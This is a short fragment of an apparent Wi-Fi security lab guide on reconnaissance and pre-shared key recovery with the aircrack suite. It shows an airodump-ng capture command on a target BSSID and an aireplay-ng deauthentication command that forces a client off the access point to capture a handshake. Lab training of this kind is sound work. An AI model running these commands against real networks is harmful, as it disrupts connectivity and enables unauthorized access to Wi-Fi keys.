---
title: Lab 02 - Airsuite Tools - Recon and Pre-Shared Key Recovery
---
...
```
airodump-ng wlan0mon -c 6 --bssid 02:00:00:00:0B:00 -w wificap1
```
...
Run the following command in the other panel terminal. 

```
aireplay-ng wlan0mon -0 100 -a 02:00:00:00:0B:00 -c 02:00:00:00:03:00
```
